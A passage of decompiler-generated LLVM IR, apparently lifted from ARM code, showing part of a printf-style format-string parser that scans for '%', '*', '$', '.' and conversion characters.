  %v9_136ac = icmp eq i8 %v2_136a8, %v2_136a4
  br i1 %v9_136ac, label %dec_label_pc_1369c.loopexit, label %dec_label_pc_136bc

dec_label_pc_136bc:                               ; preds = %dec_label_pc_136a4
  %v1_136bc = inttoptr i32 %v5_136a4 to i8*
  %v2_136bc = load i8, i8* %v1_136bc, align 1
  %v3_136bc = zext i8 %v2_136bc to i32
  store i32 %v3_136bc, i32* %r3.global-to-local, align 4
  %v2_136c0 = icmp eq i8 %v2_136bc, 0
  %v2_136c4 = mul i32 %v0_136c4, 2
  store i32 %v2_136c4, i32* %r1.global-to-local, align 4
  br i1 %v2_136c0, label %dec_label_pc_136cc, label %dec_label_pc_136a4

dec_label_pc_136cc:                               ; preds = %dec_label_pc_136bc
  %v1_136cc = add i32 %v0_136a876, -1
  %v2_136cc = inttoptr i32 %v1_136cc to i8*
  %v3_136cc = load i8, i8* %v2_136cc, align 1
  %v7_136d0 = icmp eq i8 %v3_136cc, 37
  %v0_136d4 = load i32, i32* @r4, align 4
  %v1_136d4 = and i32 %v0_136d4, 10
  store i32 %v1_136d4, i32* %r3.global-to-local, align 4
  %v4_136d8 = udiv i32 %v1_136d4, 2
  %v5_136d8 = sub nuw nsw i32 -1, %v4_136d8
  %v6_136d8 = and i32 %v0_136d4, %v5_136d8
  store i32 %v6_136d8, i32* @r4, align 4
  br i1 %v7_136d0, label %dec_label_pc_136e0, label %dec_label_pc_13598

dec_label_pc_136e0:                               ; preds = %dec_label_pc_136cc
  %v0_136e0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_136e0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_136e4

dec_label_pc_136e4:                               ; preds = %bb147, %dec_label_pc_13618, %dec_label_pc_13674, %dec_label_pc_136e0
  %v1_13724 = phi i32 [ %v0_136a876, %dec_label_pc_136e0 ], [ %v0_13680, %bb147 ], [ %v0_13680, %dec_label_pc_13674 ], [ %v0_13680, %dec_label_pc_13618 ]
  %v0_13720 = phi i32 [ %v5_136a4, %dec_label_pc_136e0 ], [ %v0_13618, %bb147 ], [ %v0_13618, %dec_label_pc_13674 ], [ %v0_13618, %dec_label_pc_13618 ]
  %stack_var_-44.3 = phi i32 [ %stack_var_-44.2, %dec_label_pc_136e0 ], [ %stack_var_-44.1, %bb147 ], [ %stack_var_-44.1, %dec_label_pc_13674 ], [ %stack_var_-44.1, %dec_label_pc_13618 ]
  %v1_136e4 = inttoptr i32 %v0_13720 to i8*
  %v2_136e4 = load i8, i8* %v1_136e4, align 1
  %v3_136e4 = zext i8 %v2_136e4 to i32
  store i32 %v3_136e4, i32* %r3.global-to-local, align 4
  %v7_136e8 = icmp eq i8 %v2_136e4, 42
  br i1 %v7_136e8, label %dec_label_pc_136f0, label %dec_label_pc_13730

dec_label_pc_136f0:                               ; preds = %dec_label_pc_136e4
  %v0_136f0 = load i32, i32* %fp.global-to-local, align 4
  %v2_136f0 = icmp eq i32 %v0_136f0, 0
  br i1 %v2_136f0, label %dec_label_pc_13720, label %dec_label_pc_136f8

dec_label_pc_136f8:                               ; preds = %dec_label_pc_136f0
  %v1_136f8 = inttoptr i32 %v1_13724 to i8*
  %v2_136f8 = load i8, i8* %v1_136f8, align 1
  %v3_136f8 = zext i8 %v2_136f8 to i32
  store i32 %v3_136f8, i32* %r3.global-to-local, align 4
  %v7_136fc = icmp eq i8 %v2_136f8, 36
  br i1 %v7_136fc, label %dec_label_pc_13704, label %dec_label_pc_13a18

dec_label_pc_13704:                               ; preds = %dec_label_pc_136f8
  %v0_13704 = load i32, i32* %r1.global-to-local, align 4
  %tmp148 = icmp slt i32 %v0_13704, 1
  br i1 %tmp148, label %dec_label_pc_13a18, label %dec_label_pc_1370c

dec_label_pc_1370c:                               ; preds = %dec_label_pc_13704
  %v0_13710 = load i32, i32* %r8.global-to-local, align 4
  %v1_13710 = load i32, i32* %sb.global-to-local, align 4
  %v3_13710 = mul i32 %v1_13710, %v0_13710
  %v4_13710 = add i32 %v3_13710, %v3_135a4.pre-phi
  store i32 %v4_13710, i32* %r3.global-to-local, align 4
  %v1_13714 = add i32 %v1_13724, 1
  store i32 %v1_13714, i32* %r6.global-to-local, align 4
  %v2_13718 = add i32 %v4_13710, -12
  %v3_13718 = inttoptr i32 %v2_13718 to i32*
  store i32 %v0_13704, i32* %v3_13718, align 4
  br label %dec_label_pc_1372c

dec_label_pc_13720:                               ; preds = %dec_label_pc_136f0
  %v1_13720 = add i32 %v0_13720, 1
  store i32 %v1_13720, i32* %r3.global-to-local, align 4
  %v9_13724 = icmp eq i32 %v1_13720, %v1_13724
  br i1 %v9_13724, label %dec_label_pc_1372c, label %dec_label_pc_13a18

dec_label_pc_1372c:                               ; preds = %dec_label_pc_13720, %dec_label_pc_1370c
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13730

dec_label_pc_13730:                               ; preds = %dec_label_pc_136e4, %dec_label_pc_1372c
  %v0_13730 = load i32, i32* %r8.global-to-local, align 4
  %v2_13730 = icmp eq i32 %v0_13730, 0
  br i1 %v2_13730, label %dec_label_pc_1373c, label %dec_label_pc_1375c.loopexit

dec_label_pc_1373c:                               ; preds = %dec_label_pc_13730
  %v0_1373c = load i32, i32* %r6.global-to-local, align 4
  %v1_1373c = inttoptr i32 %v0_1373c to i8*
  %v2_1373c = load i8, i8* %v1_1373c, align 1
  %v3_1373c = zext i8 %v2_1373c to i32
  store i32 %v3_1373c, i32* %r3.global-to-local, align 4
  %v7_13740 = icmp eq i8 %v2_1373c, 46
  br i1 %v7_13740, label %.thread20, label %dec_label_pc_13754

.thread20:                                        ; preds = %dec_label_pc_1373c
  %v2_13744 = add i32 %v0_1373c, 1
  store i32 %v2_13744, i32* %r6.global-to-local, align 4
  %v1_13748 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_13748, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_13598

dec_label_pc_13754:                               ; preds = %dec_label_pc_1373c
  %v0_13754 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13754, i32* %sl.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_1375c

dec_label_pc_1375c.loopexit:                      ; preds = %dec_label_pc_13730
  %v1_13734 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_13734, i32* @r5, align 4
  %v0_13768.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1375c

dec_label_pc_1375c:                               ; preds = %dec_label_pc_1375c.loopexit, %dec_label_pc_13754
  %v0_13768.pre = phi i32 [ %v0_13768.pre.pre, %dec_label_pc_1375c.loopexit ], [ %v0_1373c, %dec_label_pc_13754 ]
  store i32 -5412, i32* %r3.global-to-local, align 4
  %v0_13760 = load i32, i32* @lr, align 4
  %v2_13760 = add i32 %v0_13760, -5412
  store i32 %v2_13760, i32* %r1.global-to-local, align 4
  %v1_13768 = inttoptr i32 %v0_13768.pre to i8*
  br label %dec_label_pc_13764

dec_label_pc_13764:                               ; preds = %dec_label_pc_13778, %dec_label_pc_1375c
  %v0_13778 = phi i32 [ %v1_13778, %dec_label_pc_13778 ], [ %v2_13760, %dec_label_pc_1375c ]
  %v1_13764 = inttoptr i32 %v0_13778 to i8*
  %v2_13764 = load i8, i8* %v1_13764, align 1
  %v3_13764 = zext i8 %v2_13764 to i32
  store i32 %v3_13764, i32* %r2.global-to-local, align 4
  %v2_13768 = load i8, i8* %v1_13768, align 1
  %v3_13768 = zext i8 %v2_13768 to i32
  store i32 %v3_13768, i32* %r3.global-to-local, align 4
  %v9_1376c = icmp eq i8 %v2_13768, %v2_13764
  br i1 %v9_1376c, label %bb149, label %dec_label_pc_13778

bb149:                                            ; preds = %dec_label_pc_13764
  %v2_13770 = add i32 %v0_13768.pre, 1
  store i32 %v2_13770, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13784

dec_label_pc_13778:                               ; preds = %dec_label_pc_13764
  %v1_13778 = add i32 %v0_13778, 1
  %v2_13778 = inttoptr i32 %v1_13778 to i8*
  %v3_13778 = load i8, i8* %v2_13778, align 1
  %v4_13778 = zext i8 %v3_13778 to i32
  store i32 %v4_13778, i32* %r3.global-to-local, align 4
  store i32 %v1_13778, i32* %r1.global-to-local, align 4
  %v2_1377c = icmp eq i8 %v3_13778, 0
  br i1 %v2_1377c, label %dec_label_pc_13784, label %dec_label_pc_13764

dec_label_pc_13784:                               ; preds = %dec_label_pc_13778, %bb149
  %v1_137a8 = phi i32 [ %v2_13770, %bb149 ], [ %v0_13768.pre, %dec_label_pc_13778 ]
  %v1_137a4 = phi i32 [ %v0_13778, %bb149 ], [ %v1_13778, %dec_label_pc_13778 ]
  %v2_1378c = sub i32 %v1_137a4, %v2_13760
  store i32 %v2_1378c, i32* %r3.global-to-local, align 4
  %v8_13794 = icmp sgt i32 %v2_1378c, 1
  br i1 %v8_13794, label %.thread24, label %dec_label_pc_13798

dec_label_pc_13798:                               ; preds = %dec_label_pc_13784
  %v1_13798 = inttoptr i32 %v1_137a8 to i8*
  %v2_13798 = load i8, i8* %v1_13798, align 1
  %v3_13798 = zext i8 %v2_13798 to i32
  store i32 %v3_13798, i32* %r2.global-to-local, align 4
  %v1_1379c = inttoptr i32 %v1_137a4 to i8*
  %v2_1379c = load i8, i8* %v1_1379c, align 1
  %v3_1379c = zext i8 %v2_1379c to i32
  store i32 %v3_1379c, i32* %r3.global-to-local, align 4
  %v9_137a0 = icmp eq i8 %v2_13798, %v2_1379c
  br i1 %v9_137a0, label %bb150, label %.thread24

bb150:                                            ; preds = %dec_label_pc_13798
  %v2_137a4 = add i32 %v1_137a4, 9
  store i32 %v2_137a4, i32* %r1.global-to-local, align 4
  %v2_137a8 = add i32 %v1_137a8, 1
  store i32 %v2_137a8, i32* %r6.global-to-local, align 4
  br label %.thread24

.thread24:                                        ; preds = %dec_label_pc_13798, %dec_label_pc_13784, %bb150
  %v0_137b0 = phi i32 [ %v1_137a4, %dec_label_pc_13798 ], [ %v1_137a4, %dec_label_pc_13784 ], [ %v2_137a4, %bb150 ]
  %v0_137ac = phi i32 [ %v1_137a8, %dec_label_pc_13798 ], [ %v1_137a8, %dec_label_pc_13784 ], [ %v2_137a8, %bb150 ]
  %v1_137ac = inttoptr i32 %v0_137ac to i8*
  %v2_137ac = load i8, i8* %v1_137ac, align 1
  %v3_137ac = zext i8 %v2_137ac to i32
  store i32 %v3_137ac, i32* %r2.global-to-local, align 4
  %v1_137b0 = add i32 %v0_137b0, 9
  %v2_137b0 = inttoptr i32 %v1_137b0 to i8*
  %v3_137b0 = load i8, i8* %v2_137b0, align 1
  %v4_137b0 = zext i8 %v3_137b0 to i32
  store i32 %v4_137b0, i32* %r3.global-to-local, align 4
  %v2_137b4 = icmp eq i8 %v2_137ac, 0
  %v3_137b8 = mul nuw nsw i32 %v4_137b0, 256
  store i32 %v3_137b8, i32* @ip, align 4
  br i1 %v2_137b4, label %dec_label_pc_13a18, label %dec_label_pc_137c0

dec_label_pc_137c0:                               ; preds = %.thread24
  store i32 -5312, i32* %r3.global-to-local, align 4
  %v2_137c4 = add i32 %v0_13760, -5312
  store i32 %v2_137c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_137c8

dec_label_pc_137c8:                               ; preds = %dec_label_pc_1384c, %dec_label_pc_137c0
  %v1_137dc = phi i32 [ %v1_1384c, %dec_label_pc_1384c ], [ %v2_137c4, %dec_label_pc_137c0 ]
  %v1_137c8 = inttoptr i32 %v1_137dc to i8*
  %v2_137c8 = load i8, i8* %v1_137c8, align 1
  %v3_137c8 = zext i8 %v2_137c8 to i32
  store i32 %v3_137c8, i32* %r3.global-to-local, align 4
  %v9_137cc = icmp eq i8 %v2_137c8, %v2_137ac
  br i1 %v9_137cc, label %dec_label_pc_137d4, label %dec_label_pc_1384c

dec_label_pc_137d4:                               ; preds = %dec_label_pc_137c8
  store i32 %v2_137c4, i32* %r3.global-to-local, align 4
  %v2_137dc = sub i32 %v1_137dc, %v2_137c4
  store i32 %v2_137dc, i32* %r1.global-to-local, align 4
  %v7_137e4 = icmp slt i32 %v2_137dc, 18
  br i1 %v7_137e4, label %bb152, label %dec_label_pc_137e8

dec_label_pc_137e8:                               ; preds = %dec_label_pc_137d4
  %v1_137e8 = and i32 %v3_137b8, 1024
  %v2_137e8 = icmp eq i32 %v1_137e8, 0
  br i1 %v2_137e8, label %bb152, label %bb151

bb151:                                            ; preds = %dec_label_pc_137e8
  %v2_137ec = add i32 %v2_137dc, -2
  store i32 %v2_137ec, i32* %r1.global-to-local, align 4
  br label %bb152

bb152:                                            ; preds = %dec_label_pc_137d4, %dec_label_pc_137e8, %bb151
  %v0_137f4 = phi i32 [ %v2_137dc, %dec_label_pc_137d4 ], [ %v2_137dc, %dec_label_pc_137e8 ], [ %v2_137ec, %bb151 ]
  store i32 -5360, i32* %r3.global-to-local, align 4
  %v1_137f4 = load i32, i32* %r7.global-to-local, align 4
  %v2_137f4 = add i32 %v1_137f4, 32
  %v3_137f4 = inttoptr i32 %v2_137f4 to i32*
  store i32 %v0_137f4, i32* %v3_137f4, align 4
  %v0_137f8 = load i32, i32* @lr, align 4
  %v1_137f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_137f8 = add i32 %v1_137f8, %v0_137f8
  store i32 %v2_137f8, i32* %r3.global-to-local, align 4
  %v1_137fc = add i32 %v2_137f8, -1
  store i32 %v1_137fc, i32* %r0.global-to-local, align 4
  %v0_13804.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_13800

dec_label_pc_13800:                               ; preds = %dec_label_pc_13800, %bb152
  %v0_13800 = phi i32 [ %v1_13800, %dec_label_pc_13800 ], [ %v1_137fc, %bb152 ]
  %v1_13800 = add i32 %v0_13800, 1
  %v2_13800 = inttoptr i32 %v1_13800 to i8*
  %v3_13800 = load i8, i8* %v2_13800, align 1
  %v4_13800 = zext i8 %v3_13800 to i32
  store i32 %v4_13800, i32* %r3.global-to-local, align 4
  store i32 %v1_13800, i32* %r0.global-to-local, align 4
  %v8_13808 = icmp sgt i32 %v0_13804.pre, %v4_13800
  br i1 %v8_13808, label %dec_label_pc_13800, label %dec_label_pc_1380c

dec_label_pc_1380c:                               ; preds = %dec_label_pc_13800
  %v2_13814.neg = sub i32 5360, %v0_137f8
  %v2_13818 = add i32 %v2_13814.neg, %v1_13800
  %v2_1381c = mul i32 %v2_13818, 2
  store i32 %v2_1381c, i32* %r2.global-to-local, align 4
  %v2_13820 = add i32 %v0_137f8, -5376
  store i32 %v2_13820, i32* %r3.global-to-local, align 4
  %v2_13824 = add i32 %v2_1381c, %v2_13820
  %v3_13824 = inttoptr i32 %v2_13824 to i16*
  %v4_13824 = load i16, i16* %v3_13824, align 2
  %v6_13824 = sext i16 %v4_13824 to i32
  store i32 %v6_13824, i32* %r1.global-to-local, align 4
  %v2_1382c = add i32 %v0_137f8, -5392
  store i32 %v2_1382c, i32* %r3.global-to-local, align 4
  %v2_13830 = add i32 %v2_1381c, %v2_1382c
  %v3_13830 = inttoptr i32 %v2_13830 to i16*
  %v4_13830 = load i16, i16* %v3_13830, align 2
  %v6_13830 = sext i16 %v4_13830 to i32
  %v1_13834 = load i32, i32* @ip, align 4
  %v2_13834 = or i32 %v1_13834, %v6_13824
  %v2_13838 = and i32 %v2_13834, %v6_13830
  store i32 %v2_13838, i32* %r1.global-to-local, align 4
  store i32 -5312, i32* %r3.global-to-local, align 4
  %v2_13840 = add i32 %v0_137f8, -5312
  store i32 %v2_13840, i32* %r0.global-to-local, align 4
  store i32 %v2_13838, i32* %stack_var_-72, align 4
  %v0_13864.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13858

dec_label_pc_1384c:                               ; preds = %dec_label_pc_137c8
  %v1_1384c = add i32 %v1_137dc, 1
  %v2_1384c = inttoptr i32 %v1_1384c to i8*
  %v3_1384c = load i8, i8* %v2_1384c, align 1
  %v4_1384c = zext i8 %v3_1384c to i32
  store i32 %v4_1384c, i32* %r3.global-to-local, align 4
  store i32 %v1_1384c, i32* %r0.global-to-local, align 4
  %v2_13850 = icmp eq i8 %v3_1384c, 0
  br i1 %v2_13850, label %dec_label_pc_13858, label %dec_label_pc_137c8

dec_label_pc_13858:                               ; preds = %dec_label_pc_1384c, %dec_label_pc_1380c
  %v0_13864 = phi i32 [ %v0_13864.pre, %dec_label_pc_1380c ], [ %v0_137ac, %dec_label_pc_1384c ]
  %v0_13860 = phi i32 [ %v1_13834, %dec_label_pc_1380c ], [ %v3_137b8, %dec_label_pc_1384c ]
  %v0_13858 = load i32, i32* @r4, align 4
  %v1_13858 = and i32 %v0_13858, 4
  %v1_1385c = and i32 %v0_13858, -5
  store i32 %v1_1385c, i32* %r3.global-to-local, align 4
  %v1_13860 = and i32 %v0_13860, 3840
  store i32 %v1_13860, i32* %r2.global-to-local, align 4
  %v1_13864 = inttoptr i32 %v0_13864 to i8*
  %v2_13864 = load i8, i8* %v1_13864, align 1
  %v3_13864 = zext i8 %v2_13864 to i32
  store i32 %v3_13864, i32* %r1.global-to-local, align 4
  %v2_13868 = or i32 %v1_1385c, %v1_13860
  store i32 %v2_13868, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_13858, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_13874 = load i32, i32* %r7.global-to-local, align 4
  %v2_13874 = add i32 %v1_13874, 20
  %v3_13874 = inttoptr i32 %v2_13874 to i32*
  store i32 %tmp181, i32* %v3_13874, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_1387c = load i32, i32* %r1.global-to-local, align 4
  %v1_1387c = load i32, i32* %r7.global-to-local, align 4
  %v2_1387c = add i32 %v1_1387c, 12
  %v3_1387c = inttoptr i32 %v2_1387c to i32*
  store i32 %v0_1387c, i32* %v3_1387c, align 4
  %v0_13880 = load i32, i32* %r7.global-to-local, align 4
  %v1_13880 = add i32 %v0_13880, 4
  %v2_13880 = inttoptr i32 %v1_13880 to i32*
  %v3_13880 = load i32, i32* @r5, align 4
  store i32 %v3_13880, i32* %v2_13880, align 4
  %v4_13880 = add i32 %v0_13880, 8
  %v5_13880 = inttoptr i32 %v4_13880 to i32*
  %v6_13880 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_13880, i32* %v5_13880, align 4
  %v0_13884 = load i32, i32* %r2.global-to-local, align 4
  %v1_13884 = load i32, i32* %r7.global-to-local, align 4
  %v2_13884 = add i32 %v1_13884, 16
  %v3_13884 = inttoptr i32 %v2_13884 to i32*
  store i32 %v0_13884, i32* %v3_13884, align 4
  %v0_13888 = load i32, i32* %r3.global-to-local, align 4
  %v1_13888 = load i32, i32* %r7.global-to-local, align 4
  %v2_13888 = add i32 %v1_13888, 28
  %v3_13888 = inttoptr i32 %v2_13888 to i32*
  store i32 %v0_13888, i32* %v3_13888, align 4
  %v0_1388c = load i32, i32* %r0.global-to-local, align 4
  %v1_1388c = inttoptr i32 %v0_1388c to i8*
  %v2_1388c = load i8, i8* %v1_1388c, align 1
  %v3_1388c = zext i8 %v2_1388c to i32
  store i32 %v3_1388c, i32* %r2.global-to-local, align 4
  %v2_13890 = icmp eq i8 %v2_1388c, 0
  br i1 %v2_13890, label %dec_label_pc_13898, label %dec_label_pc_1391c

dec_label_pc_13898:                               ; preds = %dec_label_pc_13858
  %v0_13898 = load i32, i32* %r6.global-to-local, align 4
  %v1_13898 = inttoptr i32 %v0_13898 to i8*
  %v2_13898 = load i8, i8* %v1_13898, align 1
  %v3_13898 = zext i8 %v2_13898 to i32
  store i32 %v3_13898, i32* %r3.global-to-local, align 4
  %v7_1389c = icmp eq i8 %v2_13898, 109
  br i1 %v7_1389c, label %.thread28, label %dec_label_pc_138b0

.thread28:                                        ; preds = %dec_label_pc_13898
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_138a4 = load i32, i32* %r7.global-to-local, align 4
  %v3_138a4 = add i32 %v2_138a4, 32
  %v4_138a4 = inttoptr i32 %v3_138a4 to i32*
  store i32 20, i32* %v4_138a4, align 4
  %v1_138a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_138a8 = load i32, i32* %r7.global-to-local, align 4
  %v3_138a8 = add i32 %v2_138a8, 28
  %v4_138a8 = inttoptr i32 %v3_138a8 to i32*
  store i32 %v1_138a8, i32* %v4_138a8, align 4
  br label %dec_label_pc_1391c

dec_label_pc_138b0:                               ; preds = %dec_label_pc_13898
  store i32 1072, i32* %r3.global-to-local, align 4
  %v0_138b4 = load i32, i32* @lr, align 4
  %v2_138b4 = add i32 %v0_138b4, 1072
  %v3_138b4 = inttoptr i32 %v2_138b4 to i32*
  %v4_138b4 = load i32, i32* %v3_138b4, align 4
  store i32 %v4_138b4, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_138bc = load i32, i32* %r7.global-to-local, align 4
  %v2_138bc = add i32 %v1_138bc, 32
  %v3_138bc = inttoptr i32 %v2_138bc to i32*
  store i32 21, i32* %v3_138bc, align 4
  %v0_138c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_138c0, i32* @ip, align 4
  %v1_138c4 = add i32 %v0_138c0, 10
  store i32 %v1_138c4, i32* %r0.global-to-local, align 4
  %v0_138cc.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_138cc = inttoptr i32 %v0_138cc.pre to i8*
  br label %dec_label_pc_138c8

dec_label_pc_138c8:                               ; preds = %dec_label_pc_1390c, %dec_label_pc_138b0
  %v1_138d8 = phi i32 [ %v1_1390c, %dec_label_pc_1390c ], [ %v0_138c0, %dec_label_pc_138b0 ]
  %v1_138c8 = inttoptr i32 %v1_138d8 to i8*
  %v2_138c8 = load i8, i8* %v1_138c8, align 1
  %v3_138c8 = zext i8 %v2_138c8 to i32
  store i32 %v3_138c8, i32* %r2.global-to-local, align 4
  %v2_138cc = load i8, i8* %v1_138cc, align 1
  %v3_138cc = zext i8 %v2_138cc to i32
  store i32 %v3_138cc, i32* %r3.global-to-local, align 4
  %v9_138d0 = icmp eq i8 %v2_138c8, %v2_138cc
  br i1 %v9_138d0, label %dec_label_pc_138d8, label %dec_label_pc_1390c

dec_label_pc_138d8:                               ; preds = %dec_label_pc_138c8
  %v2_138d8 = sub i32 %v1_138d8, %v0_138c0
  store i32 %v2_138d8, i32* %r3.global-to-local, align 4
  %v0_138e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_138e0 = add i32 %v0_138e0, 4
  store i32 %v1_138e0, i32* %r0.global-to-local, align 4
  %v0_138e4 = load i32, i32* @lr, align 4
  %v2_138e4 = add i32 %v0_138e4, 26572
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_138ec = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_138ec, i32* %r2.global-to-local, align 4
  %v4_138f0 = mul i32 %v2_138d8, 4
  %v5_138f0 = add i32 %v2_138e4, %v4_138f0
  %v6_138f0 = inttoptr i32 %v5_138f0 to i32*
  %v7_138f0 = load i32, i32* %v6_138f0, align 4
  store i32 %v7_138f0, i32* @ip, align 4
  store i32 80124, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_138f0)
  %v0_138fc = load i32, i32* %r0.global-to-local, align 4
  %v1_13900 = load i32, i32* %r7.global-to-local, align 4
  %v2_13900 = add i32 %v1_13900, 28
  %v3_13900 = inttoptr i32 %v2_13900 to i32*
  store i32 %v0_138fc, i32* %v3_13900, align 4
  %v7_13904 = icmp sgt i32 %v0_138fc, 5
  br i1 %v7_13904, label %dec_label_pc_13a18, label %dec_label_pc_1391c

dec_label_pc_1390c:                               ; preds = %dec_label_pc_138c8
  %v1_1390c = add i32 %v1_138d8, 1
  store i32 %v1_1390c, i32* %r1.global-to-local, align 4
  %v3_13910 = icmp ult i32 %v1_1390c, %v1_138c4
  br i1 %v3_13910, label %dec_label_pc_138c8, label %dec_label_pc_13a18

dec_label_pc_1391c:                               ; preds = %.thread28, %dec_label_pc_138d8, %dec_label_pc_13858
  %v0_1391c = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_1391c, 1
  br i1 %tmp156, label %dec_label_pc_139c8, label %dec_label_pc_13924

dec_label_pc_13924:                               ; preds = %dec_label_pc_1391c
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_1393c = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_13928

dec_label_pc_13928:                               ; preds = %dec_label_pc_139b0, %dec_label_pc_13924
  %v9_13948 = phi i32 [ 0, %dec_label_pc_13924 ], [ %v1_139b4, %dec_label_pc_139b0 ]
  %v7_1392c = icmp sgt i32 %v9_13948, 2
  br i1 %v7_1392c, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_13928
  store i32 %v9_1393c, i32* %r3.global-to-local, align 4
  %v10_13948 = add i32 %v9_13948, %v9_1393c
  store i32 %v10_13948, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_13928
  store i32 %v3_135a4.pre-phi, i32* @ip, align 4
  %v12_13930 = mul i32 %v9_13948, 4
  %v13_13930 = add i32 %v12_13930, %v3_135a4.pre-phi
  store i32 %v13_13930, i32* %r3.global-to-local, align 4
  %v9_13938 = add i32 %v13_13930, -12
  %v10_13938 = inttoptr i32 %v9_13938 to i8*
  %v11_13938 = load i8, i8* %v10_13938, align 4
  %v12_13938 = zext i8 %v11_13938 to i32
  store i32 %v12_13938, i32* %r2.global-to-local, align 4
  %v9_13940 = load i32, i32* %r7.global-to-local, align 4
  %v10_13940 = add i32 %v9_13940, %v9_13948
  store i32 %v10_13940, i32* %r3.global-to-local, align 4
  store i32 %v12_13938, i32* %r1.global-to-local, align 4
  %v11_1394c = add i32 %v10_13940, 36
  %v12_1394c = inttoptr i32 %v11_1394c to i8*
  store i8 %v11_13938, i8* %v12_1394c, align 1
  %v0_13950.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_13970 = phi i32 [ %v10_13948, %.thread38 ], [ %v0_13950.pre, %bb157 ]
  %v1_13950 = load i32, i32* %fp.global-to-local, align 4
  %v2_13950 = sub i32 %v0_13970, %v1_13950
  %v4_13950 = xor i32 %v1_13950, %v0_13970
  %v5_13950 = xor i32 %v2_13950, %v0_13970
  %v6_13950 = and i32 %v5_13950, %v4_13950
  %v7_13950 = icmp slt i32 %v6_13950, 0
  %v8_13950 = icmp slt i32 %v2_13950, 0
  %v9_13950 = icmp eq i32 %v0_13970, %v1_13950
  %v3_13954 = xor i1 %v8_13950, %v7_13950
  %v4_13954 = or i1 %v9_13950, %v3_13954
  br i1 %v4_13954, label %dec_label_pc_13964, label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %bb158
  %v1_13958 = add i32 %v0_13970, -9
  %v3_13958 = sub i32 8, %v0_13970
  %v4_13958 = and i32 %v3_13958, %v0_13970
  %v5_13958 = icmp slt i32 %v4_13958, 0
  %v6_13958 = icmp slt i32 %v1_13958, 0
  %v7_13958 = icmp eq i32 %v0_13970, 9
  %v3_1395c = xor i1 %v6_13958, %v5_13958
  %v4_1395c = or i1 %v7_13958, %v3_1395c
  br i1 %v4_1395c, label %dec_label_pc_13960, label %dec_label_pc_13a18

dec_label_pc_13960:                               ; preds = %dec_label_pc_13958
  store i32 %v0_13970, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_13964

dec_label_pc_13964:                               ; preds = %bb158, %dec_label_pc_13960
  store i32 %v3_135a4.pre-phi, i32* @r2, align 4
  %v1_13968 = load i32, i32* %r8.global-to-local, align 4
  %v4_13968 = mul i32 %v1_13968, 4
  %v5_13968 = add i32 %v4_13968, %v3_135a4.pre-phi
  store i32 %v5_13968, i32* %sb.global-to-local, align 4
  %v1_1396c = add i32 %v5_13968, -40
  %v2_1396c = inttoptr i32 %v1_1396c to i32*
  %v3_1396c = load i32, i32* %v2_1396c, align 4
  store i32 %v3_1396c, i32* %r5.global-to-local, align 4
  %v1_13970 = add i32 %v0_13970, -1
  store i32 %v1_13970, i32* %r3.global-to-local, align 4
  %v0_13974 = load i32, i32* %r7.global-to-local, align 4
  %v4_13974 = mul i32 %v1_13970, 4
  %v5_13974 = add i32 %v0_13974, %v4_13974
  store i32 %v5_13974, i32* %sl.global-to-local, align 4
  %v7_13978 = icmp eq i32 %v3_1396c, 8
  %v1_1397c = add i32 %v5_13974, 40
  %v2_1397c = inttoptr i32 %v1_1397c to i32*
  %v3_1397c = load i32, i32* %v2_1397c, align 4
  store i32 %v3_1397c, i32* @r0, align 4
  br i1 %v7_13978, label %dec_label_pc_139b0, label %dec_label_pc_13984

dec_label_pc_13984:                               ; preds = %dec_label_pc_13964
  %v9_13984 = icmp eq i32 %v3_1397c, %v3_1396c
  br i1 %v9_13984, label %dec_label_pc_139a8, label %bb159

bb159:                                            ; preds = %dec_label_pc_13984
  %v8_13988 = icmp eq i32 %v3_1397c, 8
  br i1 %v8_13988, label %dec_label_pc_139a8, label %dec_label_pc_13990

dec_label_pc_13990:                               ; preds = %bb159
  %v0_13990 = call i32 @_promoted_size()
  %v0_13998 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13998, i32* @r0, align 4
  %v0_1399c = call i32 @_promoted_size()
  store i32 %v0_1399c, i32* %r0.global-to-local, align 4
  %v8_139a4 = icmp sgt i32 %v0_13990, %v0_1399c
  br i1 %v8_139a4, label %dec_label_pc_139b0, label %dec_label_pc_13990.dec_label_pc_139a8_crit_edge

dec_label_pc_13990.dec_label_pc_139a8_crit_edge:  ; preds = %dec_label_pc_13990
  %v0_139a8.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_139ac.pre = load i32, i32* %sl.global-to-local, align 4
